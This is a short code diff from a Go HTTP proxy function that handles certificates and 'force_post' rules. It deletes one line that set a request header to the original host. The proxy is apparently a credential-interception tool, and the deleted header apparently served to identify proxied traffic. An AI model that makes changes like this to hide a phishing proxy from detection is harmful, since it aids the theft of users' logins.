@@ -656,7 +656,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// force_post checking
 				if pl != nil {
-					req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					method := req.Method
 					if err == nil && method == "POST" {
